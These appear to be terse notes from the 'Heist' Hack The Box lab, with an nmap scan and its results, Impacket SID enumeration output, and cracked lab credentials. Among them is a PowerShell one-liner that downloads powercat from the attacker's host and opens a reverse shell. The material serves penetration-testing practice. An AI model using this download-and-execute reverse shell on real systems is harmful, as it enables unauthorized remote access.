Heist - Windows machine from HTB

Initial port scanning against the target:

root@kali:~# nmap -v -p 1-65535 -sV -O -sS -T4 10.10.10.149


powershell to download the script and execute it to get reverse shell:

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.101/powercat/powercat.ps1');powercat -c 10.10.14.101 -p 9091 -e cmd"



notes:

rout3r-$uperP@ssword
admin-Q4)sJu\Y8qz*A3?d

chase:Q4)sJu\Y8qz*A3?d

hazard:stealth1agent	

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49668/tcp open  msrpc         Microsoft Windows RPC
					

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
root@kali:~# 
